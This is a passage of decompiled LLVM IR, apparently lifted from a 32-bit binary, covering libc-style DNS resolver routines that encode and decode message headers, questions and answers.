  %v0_16b68 = phi i32 [ %v0_16aa0.pre, %dec_label_pc_16b60 ], [ %v0_16b68.pre, %dec_label_pc_16b28 ]
  %v1_16b68 = load i32, i32* @r7, align 4
  %v2_16b68 = add i32 %v1_16b68, %v0_16b68
  %v7_16b6c = icmp eq i32 %v2_16b68, 8
  br i1 %v7_16b6c, label %bb53, label %.thread4

bb53:                                             ; preds = %dec_label_pc_16b68
  %v4_16b74 = inttoptr i32 %v3_16b74 to i8*
  store i8 58, i8* %v4_16b74, align 1
  %v5_16b74 = load i32, i32* @r4, align 4
  %v6_16b74 = add i32 %v5_16b74, 1
  store i32 %v6_16b74, i32* @r4, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16b68, %dec_label_pc_16b60, %bb53
  %v2_16b7c = phi i32 [ %v3_16b74, %dec_label_pc_16b68 ], [ %v3_16ac424, %dec_label_pc_16b60 ], [ %v6_16b74, %bb53 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_16b7c = inttoptr i32 %v2_16b7c to i8*
  store i8 0, i8* %v3_16b7c, align 1
  %v4_16b7c = load i32, i32* @r4, align 4
  %v5_16b7c = add i32 %v4_16b7c, 1
  store i32 %v2_16a94, i32* %r1.global-to-local, align 4
  %v2_16b84 = sub i32 %v5_16b7c, %v2_16a94
  %v1_16b88 = load i32, i32* @sl, align 4
  %tmp69 = icmp ugt i32 %v2_16b84, %v1_16b88
  br i1 %tmp69, label %dec_label_pc_16b90, label %dec_label_pc_16ba4

dec_label_pc_16b90:                               ; preds = %.thread4
  %v0_16b90 = call i32 @__errno_location()
  %v0_16b98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16b98, i32* %r2.global-to-local, align 4
  %v2_16b9c = inttoptr i32 %v0_16b90 to i32*
  store i32 28, i32* %v2_16b9c, align 4
  %v0_16bc4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16bc4

dec_label_pc_16ba4:                               ; preds = %.thread4
  %v0_16ba4 = load i32, i32* @sb, align 4
  %v2_16ba8 = bitcast i32* %stack_var_-110 to i8*
  %v3_16ba8 = call i32 @strcpy(i32 %v0_16ba4, i8* %v2_16ba8)
  br label %dec_label_pc_16bac

dec_label_pc_16bac:                               ; preds = %dec_label_pc_16b08, %dec_label_pc_169a0, %dec_label_pc_16ba4
  %v0_16bac = phi i32 [ 0, %dec_label_pc_16b08 ], [ %v3_169ac, %dec_label_pc_169a0 ], [ %v3_16ba8, %dec_label_pc_16ba4 ]
  store i32 %v0_16bac, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16bc4

dec_label_pc_16bb4:                               ; preds = %dec_label_pc_16994
  %v0_16bb4 = call i32 @__errno_location()
  %v2_16bbc = inttoptr i32 %v0_16bb4 to i32*
  store i32 97, i32* %v2_16bbc, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16bc4

dec_label_pc_16bc4:                               ; preds = %dec_label_pc_16bac, %dec_label_pc_16b90, %dec_label_pc_16bb4
  %v0_16bc4 = phi i32 [ %v0_16bac, %dec_label_pc_16bac ], [ %v0_16bc4.pre, %dec_label_pc_16b90 ], [ 0, %dec_label_pc_16bb4 ]
  store i32 %v6_16978, i32* %r5.global-to-local, align 4
  ret i32 %v0_16bc4

; uselistorder directives
  uselistorder i1 %v7_16aa0, { 1, 0 }
  uselistorder i32 %v0_16aa0.pre, { 1, 0, 2 }
  uselistorder i32 %v1_16b54, { 1, 0, 2 }
  uselistorder i32 %v0_16b18, { 4, 3, 1, 0, 2 }
  uselistorder i32 %v3_16ad464, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16abc65, { 2, 0, 1 }
  uselistorder i32 %v0_16acc66, { 3, 2, 0, 1 }
  uselistorder i32 %v2_16a94, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16aa023, { 1, 0 }
  uselistorder i32 %v0_16a84, { 1, 2, 0 }
  uselistorder i32 %v1_16a58, { 1, 2, 0 }
  uselistorder i32 %v0_16a6c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_16a80, { 1, 2, 0, 3 }
  uselistorder i1 %v7_16a20, { 1, 0 }
  uselistorder i32 %v0_16a58, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_16a3c, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_16a4c, { 3, 1, 0, 2 }
  uselistorder i32 %v2_169f0, { 2, 1, 0 }
  uselistorder i32 %v1_169d0, { 3, 1, 4, 0, 2 }
  uselistorder i32 %v25_16978, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 6, 7, 0 }
  uselistorder i32 97, { 5, 6, 10, 0, 1, 9, 7, 2, 3, 4, 8 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i8 58, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i8*, i32)* @__GI_memset, { 0, 1, 13, 14, 15, 8, 23, 21, 19, 22, 9, 2, 3, 4, 5, 6, 7, 10, 11, 12, 16, 17, 18, 20, 24 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_16bc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16bac, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16b54, { 2, 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16aa0, { 1, 0 }
  uselistorder label %bb49, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16a7c, { 1, 0 }
  uselistorder label %dec_label_pc_16a58, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_16a54, { 1, 0 }
  uselistorder label %dec_label_pc_16a0c, { 1, 0 }
  uselistorder label %dec_label_pc_169e0, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_16bdc = load i32, i32* @r4, align 4
  store i32 %v3_16bdc, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_16bec = icmp sgt i32 %arg3, 11
  br i1 %v7_16bec, label %dec_label_pc_16bf0, label %dec_label_pc_16cb8

dec_label_pc_16bf0:                               ; preds = %entry
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_16bf0 = add i32 %tmp, 1
  %v2_16bf0 = inttoptr i32 %v1_16bf0 to i8*
  %v3_16bf0 = load i8, i8* %v2_16bf0, align 1
  store i8 %v3_16bf0, i8* %tmp18, align 1
  %v2_16bf8 = load i32, i32* %arg1, align 4
  %v1_16bfc = trunc i32 %v2_16bf8 to i8
  %v4_16bfc = add i32 %arg2, 1
  %v5_16bfc = inttoptr i32 %v4_16bfc to i8*
  store i8 %v1_16bfc, i8* %v5_16bfc, align 1
  %v0_16c00 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c00 = add i32 %v0_16c00, 12
  %v2_16c00 = inttoptr i32 %v1_16c00 to i32*
  %v3_16c00 = load i32, i32* %v2_16c00, align 4
  %v1_16c04 = add i32 %v0_16c00, 4
  %v2_16c04 = inttoptr i32 %v1_16c04 to i32*
  %v3_16c04 = load i32, i32* %v2_16c04, align 4
  %v1_16c08 = add i32 %v0_16c00, 16
  %v2_16c08 = inttoptr i32 %v1_16c08 to i32*
  %v3_16c08 = load i32, i32* %v2_16c08, align 4
  %v1_16c0c = add i32 %tmp, 8
  %v2_16c0c = inttoptr i32 %v1_16c0c to i32*
  %v3_16c0c = load i32, i32* %v2_16c0c, align 4
  %v2_16c10 = icmp eq i32 %v3_16c00, 0
  %. = select i1 %v2_16c10, i32 0, i32 4
  %v2_16c1c = icmp eq i32 %v3_16c04, 0
  %v1_16c20 = add i32 %v0_16c00, 20
  %v2_16c20 = inttoptr i32 %v1_16c20 to i32*
  %v3_16c20 = load i32, i32* %v2_16c20, align 4
  %storemerge12 = select i1 %v2_16c1c, i32 0, i32 128
  %v1_16c2c = urem i32 %v3_16c0c, 16
  %v2_16c30 = icmp eq i32 %v3_16c08, 0
  %.29 = select i1 %v2_16c30, i32 0, i32 2
  %v4_16c3c = mul nuw nsw i32 %v1_16c2c, 8
  %v5_16c3c = or i32 %v4_16c3c, %.
  %v2_16c40 = icmp eq i32 %v3_16c20, 0
  br i1 %v2_16c40, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16bf0
  %v2_16c44 = or i32 %v5_16c3c, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16bf0, %bb25
  %v1_16c4c = phi i32 [ %v5_16c3c, %dec_label_pc_16bf0 ], [ %v2_16c44, %bb25 ]
  %v2_16c48 = or i32 %.29, %storemerge12
  %v2_16c4c = or i32 %v2_16c48, %v1_16c4c
  %v1_16c50 = trunc i32 %v2_16c4c to i8
  %v2_16c50 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c50 = add i32 %v2_16c50, 2
  %v4_16c50 = inttoptr i32 %v3_16c50 to i8*
  store i8 %v1_16c50, i8* %v4_16c50, align 1
  %v0_16c54 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c54 = add i32 %v0_16c54, 24
  %v1_16c58 = inttoptr i32 %v1_16c54 to i32*
  %v2_16c58 = load i32, i32* %v1_16c58, align 4
  %v3_16c58 = add i32 %v0_16c54, 28
  %v4_16c58 = inttoptr i32 %v3_16c58 to i32*
  %v5_16c58 = load i32, i32* %v4_16c58, align 4
  %v2_16c5c = icmp eq i32 %v2_16c58, 0
  %v1_16c60 = urem i32 %v5_16c58, 16
  %.30 = select i1 %v2_16c5c, i32 0, i32 128
  %v2_16c6c = or i32 %v1_16c60, %.30
  %v1_16c70 = trunc i32 %v2_16c6c to i8
  %v2_16c70 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c70 = add i32 %v2_16c70, 3
  %v4_16c70 = inttoptr i32 %v3_16c70 to i8*
  store i8 %v1_16c70, i8* %v4_16c70, align 1
  %v0_16c74 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c74 = add i32 %v0_16c74, 33
  %v2_16c74 = inttoptr i32 %v1_16c74 to i8*
  %v3_16c74 = load i8, i8* %v2_16c74, align 1
  %v2_16c78 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c78 = add i32 %v2_16c78, 4
  %v4_16c78 = inttoptr i32 %v3_16c78 to i8*
  store i8 %v3_16c74, i8* %v4_16c78, align 1
  %v0_16c7c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c7c = add i32 %v0_16c7c, 32
  %v2_16c7c = inttoptr i32 %v1_16c7c to i32*
  %v3_16c7c = load i32, i32* %v2_16c7c, align 4
  %v1_16c80 = trunc i32 %v3_16c7c to i8
  %v2_16c80 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c80 = add i32 %v2_16c80, 5
  %v4_16c80 = inttoptr i32 %v3_16c80 to i8*
  store i8 %v1_16c80, i8* %v4_16c80, align 1
  %v0_16c84 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c84 = add i32 %v0_16c84, 37
  %v2_16c84 = inttoptr i32 %v1_16c84 to i8*
  %v3_16c84 = load i8, i8* %v2_16c84, align 1
  %v2_16c88 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c88 = add i32 %v2_16c88, 6
  %v4_16c88 = inttoptr i32 %v3_16c88 to i8*
  store i8 %v3_16c84, i8* %v4_16c88, align 1
  %v0_16c8c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c8c = add i32 %v0_16c8c, 36
  %v2_16c8c = inttoptr i32 %v1_16c8c to i32*
  %v3_16c8c = load i32, i32* %v2_16c8c, align 4
  %v1_16c90 = trunc i32 %v3_16c8c to i8
  %v2_16c90 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c90 = add i32 %v2_16c90, 7
  %v4_16c90 = inttoptr i32 %v3_16c90 to i8*
  store i8 %v1_16c90, i8* %v4_16c90, align 1
  %v0_16c94 = load i32, i32* %lr.global-to-local, align 4
  %v1_16c94 = add i32 %v0_16c94, 41
  %v2_16c94 = inttoptr i32 %v1_16c94 to i8*
  %v3_16c94 = load i8, i8* %v2_16c94, align 1
  %v2_16c98 = load i32, i32* %r4.global-to-local, align 4
  %v3_16c98 = add i32 %v2_16c98, 8
  %v4_16c98 = inttoptr i32 %v3_16c98 to i8*
  store i8 %v3_16c94, i8* %v4_16c98, align 1
  %v0_16c9c = load i32, i32* %lr.global-to-local, align 4
  %v1_16c9c = add i32 %v0_16c9c, 40
  %v2_16c9c = inttoptr i32 %v1_16c9c to i32*
  %v3_16c9c = load i32, i32* %v2_16c9c, align 4
  %v1_16ca0 = trunc i32 %v3_16c9c to i8
  %v2_16ca0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ca0 = add i32 %v2_16ca0, 9
  %v4_16ca0 = inttoptr i32 %v3_16ca0 to i8*
  store i8 %v1_16ca0, i8* %v4_16ca0, align 1
  %v0_16ca4 = load i32, i32* %lr.global-to-local, align 4
  %v1_16ca4 = add i32 %v0_16ca4, 45
  %v2_16ca4 = inttoptr i32 %v1_16ca4 to i8*
  %v3_16ca4 = load i8, i8* %v2_16ca4, align 1
  %v2_16ca8 = load i32, i32* %r4.global-to-local, align 4
  %v3_16ca8 = add i32 %v2_16ca8, 10
  %v4_16ca8 = inttoptr i32 %v3_16ca8 to i8*
  store i8 %v3_16ca4, i8* %v4_16ca8, align 1
  %v0_16cac = load i32, i32* %lr.global-to-local, align 4
  %v1_16cac = add i32 %v0_16cac, 44
  %v2_16cac = inttoptr i32 %v1_16cac to i32*
  %v3_16cac = load i32, i32* %v2_16cac, align 4
  %v1_16cb0 = trunc i32 %v3_16cac to i8
  %v2_16cb0 = load i32, i32* %r4.global-to-local, align 4
  %v3_16cb0 = add i32 %v2_16cb0, 11
  %v4_16cb0 = inttoptr i32 %v3_16cb0 to i8*
  store i8 %v1_16cb0, i8* %v4_16cb0, align 1
  %v2_16cbc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16cb8

dec_label_pc_16cb8:                               ; preds = %entry, %bb26
  %v2_16cbc = phi i32 [ %v3_16bdc, %entry ], [ %v2_16cbc.pre, %bb26 ]
  %v0_16cb8 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_16cbc, i32* @r4, align 4
  ret i32 %v0_16cb8

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_16cb8, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_16cc0 = load i8, i8* %arg1, align 1
  %v4_16cc0 = zext i8 %v3_16cc0 to i32
  %v2_16cc4 = add i32 %tmp, 1
  %v3_16cc4 = inttoptr i32 %v2_16cc4 to i8*
  %v4_16cc4 = load i8, i8* %v3_16cc4, align 1
  %v5_16cc4 = zext i8 %v4_16cc4 to i32
  %v4_16cc8 = mul nuw nsw i32 %v4_16cc0, 256
  %v5_16cc8 = or i32 %v5_16cc4, %v4_16cc8
  %v2_16ccc = inttoptr i32 %arg2 to i32*
  store i32 %v5_16cc8, i32* %v2_16ccc, align 4
  %v2_16cd0 = add i32 %tmp, 2
  %v3_16cd0 = inttoptr i32 %v2_16cd0 to i8*
  %v4_16cd0 = load i8, i8* %v3_16cd0, align 1
  %tmp4 = icmp slt i8 %v4_16cd0, 0
  %v3_16cd4 = zext i1 %tmp4 to i32
  %v2_16cd8 = add i32 %arg2, 4
  %v3_16cd8 = inttoptr i32 %v2_16cd8 to i32*
  store i32 %v3_16cd4, i32* %v3_16cd8, align 4
  %v4_16cdc = load i8, i8* %v3_16cd0, align 1
  %div = udiv i8 %v4_16cdc, 8
  %tmp5 = urem i8 %div, 16
  %v1_16ce4 = zext i8 %tmp5 to i32
  %v2_16ce8 = add i32 %arg2, 8
  %v3_16ce8 = inttoptr i32 %v2_16ce8 to i32*
  store i32 %v1_16ce4, i32* %v3_16ce8, align 4
  %v4_16cec = load i8, i8* %v3_16cd0, align 1
  %div1 = udiv i8 %v4_16cec, 4
  %tmp6 = urem i8 %div1, 2
  %v1_16cf4 = zext i8 %tmp6 to i32
  %v2_16cf8 = add i32 %arg2, 12
  %v3_16cf8 = inttoptr i32 %v2_16cf8 to i32*
  store i32 %v1_16cf4, i32* %v3_16cf8, align 4
  %v4_16cfc = load i8, i8* %v3_16cd0, align 1
  %div2 = udiv i8 %v4_16cfc, 2
  %tmp7 = urem i8 %div2, 2
  %v1_16d04 = zext i8 %tmp7 to i32
  %v2_16d08 = add i32 %arg2, 16
  %v3_16d08 = inttoptr i32 %v2_16d08 to i32*
  store i32 %v1_16d04, i32* %v3_16d08, align 4
  %v4_16d0c = load i8, i8* %v3_16cd0, align 1
  %tmp8 = urem i8 %v4_16d0c, 2
  %v1_16d10 = zext i8 %tmp8 to i32
  %v2_16d14 = add i32 %arg2, 20
  %v3_16d14 = inttoptr i32 %v2_16d14 to i32*
  store i32 %v1_16d10, i32* %v3_16d14, align 4
  %v2_16d18 = add i32 %tmp, 3
  %v3_16d18 = inttoptr i32 %v2_16d18 to i8*
  %v4_16d18 = load i8, i8* %v3_16d18, align 1
  %tmp9 = icmp slt i8 %v4_16d18, 0
  %v3_16d1c = zext i1 %tmp9 to i32
  %v2_16d20 = add i32 %arg2, 24
  %v3_16d20 = inttoptr i32 %v2_16d20 to i32*
  store i32 %v3_16d1c, i32* %v3_16d20, align 4
  %v4_16d24 = load i8, i8* %v3_16d18, align 1
  %tmp10 = urem i8 %v4_16d24, 16
  %v1_16d28 = zext i8 %tmp10 to i32
  %v2_16d2c = add i32 %arg2, 28
  %v3_16d2c = inttoptr i32 %v2_16d2c to i32*
  store i32 %v1_16d28, i32* %v3_16d2c, align 4
  %v2_16d30 = add i32 %tmp, 4
  %v3_16d30 = inttoptr i32 %v2_16d30 to i8*
  %v4_16d30 = load i8, i8* %v3_16d30, align 1
  %v5_16d30 = zext i8 %v4_16d30 to i32
  %v2_16d34 = add i32 %tmp, 5
  %v3_16d34 = inttoptr i32 %v2_16d34 to i8*
  %v4_16d34 = load i8, i8* %v3_16d34, align 1
  %v5_16d34 = zext i8 %v4_16d34 to i32
  %v4_16d38 = mul nuw nsw i32 %v5_16d30, 256
  %v5_16d38 = or i32 %v5_16d34, %v4_16d38
  %v2_16d3c = add i32 %arg2, 32
  %v3_16d3c = inttoptr i32 %v2_16d3c to i32*
  store i32 %v5_16d38, i32* %v3_16d3c, align 4
  %v2_16d40 = add i32 %tmp, 6
  %v3_16d40 = inttoptr i32 %v2_16d40 to i8*
  %v4_16d40 = load i8, i8* %v3_16d40, align 1
  %v5_16d40 = zext i8 %v4_16d40 to i32
  %v2_16d44 = add i32 %tmp, 7
  %v3_16d44 = inttoptr i32 %v2_16d44 to i8*
  %v4_16d44 = load i8, i8* %v3_16d44, align 1
  %v5_16d44 = zext i8 %v4_16d44 to i32
  %v4_16d48 = mul nuw nsw i32 %v5_16d40, 256
  %v5_16d48 = or i32 %v5_16d44, %v4_16d48
  %v2_16d4c = add i32 %arg2, 36
  %v3_16d4c = inttoptr i32 %v2_16d4c to i32*
  store i32 %v5_16d48, i32* %v3_16d4c, align 4
  %v2_16d50 = add i32 %tmp, 8
  %v3_16d50 = inttoptr i32 %v2_16d50 to i8*
  %v4_16d50 = load i8, i8* %v3_16d50, align 1
  %v5_16d50 = zext i8 %v4_16d50 to i32
  %v2_16d54 = add i32 %tmp, 9
  %v3_16d54 = inttoptr i32 %v2_16d54 to i8*
  %v4_16d54 = load i8, i8* %v3_16d54, align 1
  %v5_16d54 = zext i8 %v4_16d54 to i32
  %v4_16d58 = mul nuw nsw i32 %v5_16d50, 256
  %v5_16d58 = or i32 %v5_16d54, %v4_16d58
  %v2_16d5c = add i32 %arg2, 40
  %v3_16d5c = inttoptr i32 %v2_16d5c to i32*
  store i32 %v5_16d58, i32* %v3_16d5c, align 4
  %v2_16d60 = add i32 %tmp, 11
  %v3_16d60 = inttoptr i32 %v2_16d60 to i8*
  %v4_16d60 = load i8, i8* %v3_16d60, align 1
  %v5_16d60 = zext i8 %v4_16d60 to i32
  %v2_16d64 = add i32 %tmp, 10
  %v3_16d64 = inttoptr i32 %v2_16d64 to i8*
  %v4_16d64 = load i8, i8* %v3_16d64, align 1
  %v5_16d64 = zext i8 %v4_16d64 to i32
  %v4_16d6c = mul nuw nsw i32 %v5_16d64, 256
  %v5_16d6c = or i32 %v4_16d6c, %v5_16d60
  %v2_16d70 = add i32 %arg2, 44
  %v3_16d70 = inttoptr i32 %v2_16d70 to i32*
  store i32 %v5_16d6c, i32* %v3_16d70, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 22, 23, 6, 9, 10, 11, 16, 4, 5, 17, 18, 19, 20, 21, 0, 12, 13, 7, 14, 15, 8, 3, 2, 1, 24 }
  uselistorder i32 40, { 10, 11, 4, 13, 1, 12, 2, 0, 5, 6, 7, 8, 9, 3 }
  uselistorder i32 28, { 32, 5, 6, 7, 33, 23, 40, 37, 39, 8, 38, 1, 24, 18, 2, 34, 35, 25, 26, 27, 28, 29, 30, 0, 31, 17, 36, 19, 20, 21, 3, 4, 22, 13, 12, 10, 11, 14, 15, 9, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 7, 4, 5, 6, 8 }
  uselistorder i8 16, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16d78 = load i32, i32* @r4, align 4
  store i32 %v3_16d78, i32* %stack_var_-16, align 4
  %v6_16d78 = load i32, i32* @r5, align 4
  %v9_16d78 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_16d80 = load i32, i32* %arg1, align 4
  store i32 %v2_16d80, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_16d8c = inttoptr i32 %v2_16d80 to i8*
  %v2_16d8c = call i32 @__encode_dotted(i8* %v1_16d8c)
  store i32 %v2_16d8c, i32* %r0.global-to-local, align 4
  %v1_16d90 = icmp slt i32 %v2_16d8c, 0
  br i1 %v1_16d90, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_16d98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_16d98, i32* @r4, align 4
  store i32 %v6_16d78, i32* @r5, align 4
  store i32 %v9_16d78, i32* @r6, align 4
  ret i32 %v2_16d8c

bb6:                                              ; preds = %entry
  %v1_16d94 = load i32, i32* @r4, align 4
  %v2_16d94 = sub i32 %v1_16d94, %v2_16d8c
  %v0_16da0 = load i32, i32* @r6, align 4
  %v2_16da0 = add i32 %v0_16da0, %v2_16d8c
  store i32 %v2_16da0, i32* %r2.global-to-local, align 4
  %v7_16da4 = icmp sgt i32 %v2_16d94, 3
  br i1 %v7_16da4, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_16da8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_16da8, i32* @r4, align 4
  store i32 %v6_16d78, i32* @r5, align 4
  store i32 %v9_16d78, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_16dac = load i32, i32* @r5, align 4
  %v1_16dac = add i32 %v0_16dac, 5
  %v2_16dac = inttoptr i32 %v1_16dac to i8*
  %v3_16dac = load i8, i8* %v2_16dac, align 1
  %v5_16db0 = inttoptr i32 %v2_16da0 to i8*
  store i8 %v3_16dac, i8* %v5_16db0, align 1
  %v0_16db4 = load i32, i32* @r5, align 4
  %v1_16db4 = add i32 %v0_16db4, 4
  %v2_16db4 = inttoptr i32 %v1_16db4 to i32*
  %v3_16db4 = load i32, i32* %v2_16db4, align 4
  %v1_16db8 = trunc i32 %v3_16db4 to i8
  %v2_16db8 = load i32, i32* %r2.global-to-local, align 4
  %v3_16db8 = add i32 %v2_16db8, 1
  %v4_16db8 = inttoptr i32 %v3_16db8 to i8*
  store i8 %v1_16db8, i8* %v4_16db8, align 1
  %v0_16dbc = load i32, i32* @r5, align 4
  %v1_16dbc = add i32 %v0_16dbc, 9
  %v2_16dbc = inttoptr i32 %v1_16dbc to i8*
  %v3_16dbc = load i8, i8* %v2_16dbc, align 1
  %v2_16dc0 = load i32, i32* %r2.global-to-local, align 4
  %v3_16dc0 = add i32 %v2_16dc0, 2
  %v4_16dc0 = inttoptr i32 %v3_16dc0 to i8*
  store i8 %v3_16dbc, i8* %v4_16dc0, align 1
  %v0_16dc4 = load i32, i32* @r5, align 4
  %v1_16dc4 = add i32 %v0_16dc4, 8
  %v2_16dc4 = inttoptr i32 %v1_16dc4 to i32*
  %v3_16dc4 = load i32, i32* %v2_16dc4, align 4
  %v0_16dc8 = load i32, i32* %r0.global-to-local, align 4
  %v1_16dc8 = add i32 %v0_16dc8, 4
  store i32 %v1_16dc8, i32* %r0.global-to-local, align 4
  %v1_16dcc = trunc i32 %v3_16dc4 to i8
  %v2_16dcc = load i32, i32* %r2.global-to-local, align 4
  %v3_16dcc = add i32 %v2_16dcc, 3
  %v4_16dcc = inttoptr i32 %v3_16dcc to i8*
  store i8 %v1_16dcc, i8* %v4_16dcc, align 1
  %v2_16dd0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_16dd0, i32* @r4, align 4
  store i32 %v6_16d78, i32* @r5, align 4
  store i32 %v9_16d78, i32* @r6, align 4
  ret i32 %v1_16dc8

; uselistorder directives
  uselistorder i32 %v2_16d8c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_16d78, { 1, 0, 2 }
  uselistorder i32 %v6_16d78, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_16dd8 = call i32 @__length_dotted()
  %v1_16ddc = icmp slt i32 %v0_16dd8, 0
  br i1 %v1_16ddc, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_16de0 = add i32 %v0_16dd8, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_16de4 = phi i32 [ %v0_16dd8, %entry ], [ %v4_16de0, %bb ]
  ret i32 %v5_16de4

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_16de8 = load i32, i32* @r4, align 4
  %v6_16de8 = load i32, i32* @r5, align 4
  %v9_16de8 = load i32, i32* @r6, align 4
  %v12_16de8 = load i32, i32* @r7, align 4
  %v21_16de8 = load i32, i32* @sl, align 4
  %v2_16dec = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_16dec, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_16e08 = call i32 @__decode_dotted()
  store i32 %v0_16e08, i32* %r0.global-to-local, align 4
  store i32 %v0_16e08, i32* @r7, align 4
  %v1_16e0c = icmp slt i32 %v0_16e08, 0
  %v0_16e10 = load i32, i32* @r4, align 4
  %v2_16e10 = add i32 %v0_16e10, %v0_16e08
  store i32 %v2_16e10, i32* %r8.global-to-local, align 4
  br i1 %v1_16e0c, label %bb14, label %dec_label_pc_16e20

dec_label_pc_16e20:                               ; preds = %entry
  %v1_16e18 = load i32, i32* @r5, align 4
  %v2_16e18 = sub i32 %v1_16e18, %v2_16e10
  %v1_16e20 = add i32 %v2_16e18, -10
  store i32 %v1_16e20, i32* @r5, align 4
  %v6_16e20 = icmp slt i32 %v1_16e20, 0
  store i32 %v2_16dec, i32* %r0.global-to-local, align 4
  %v0_16e28 = load i32, i32* @sl, align 4
  %v2_16e28 = add i32 %v0_16e28, %v2_16e10
  store i32 %v2_16e28, i32* @r4, align 4
